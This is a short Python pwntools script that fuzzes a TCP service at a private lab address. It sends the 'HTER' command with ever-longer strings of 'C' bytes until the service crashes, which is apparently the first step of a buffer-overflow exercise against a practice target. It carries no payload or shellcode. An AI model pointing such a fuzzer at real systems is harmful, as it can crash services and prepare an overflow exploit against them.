#!/usr/bin/python3

from pwn import *

host = '192.168.145.129'  # Target IP
port = 9999  # Target Port
proto = 'tcp'

s = remote(host, port)

string = "HTER "
buffer = "C" * 1000
increment = buffer

while True:
    try:

        payload = string + buffer
        print("Fuzzing", len(buffer),"bytes")
        s.send(payload)
        response = s.recv(1024) # if the server doesnt response it means it crashed
        buffer = buffer + increment
        continue
    except:
        print("Crashed at: ", len(buffer), "bytes")
        sys.exit()
